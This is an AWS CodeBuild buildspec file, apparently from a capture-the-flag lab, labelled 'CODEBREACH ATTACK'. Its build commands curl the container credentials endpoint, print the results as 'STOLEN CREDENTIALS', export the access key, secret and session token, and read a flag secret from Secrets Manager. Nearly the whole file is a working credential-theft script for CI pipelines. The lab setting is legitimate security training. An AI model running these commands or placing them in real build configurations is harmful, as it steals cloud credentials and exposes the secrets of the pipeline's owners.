version: 0.2

phases:
  build:
    commands:
      - echo "=== CODEBREACH ATTACK ==="
      - echo "=== Step 1: Get AWS Credentials ==="
      - 'echo "Credentials URI: $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"'
      - 'curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" > /tmp/creds.json'
      - 'echo "=== STOLEN CREDENTIALS ===" && cat /tmp/creds.json'
      - echo "=== Step 2: Configure AWS CLI ==="
      - export AWS_ACCESS_KEY_ID=$(cat /tmp/creds.json | jq -r '.AccessKeyId')
      - export AWS_SECRET_ACCESS_KEY=$(cat /tmp/creds.json | jq -r '.SecretAccessKey')
      - export AWS_SESSION_TOKEN=$(cat /tmp/creds.json | jq -r '.Token')
      - aws sts get-caller-identity
      - echo "=== Step 3: Get Flag from Secrets Manager ==="
      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 || echo "Direct access failed"
      - echo "=== ATTACK COMPLETE ==="
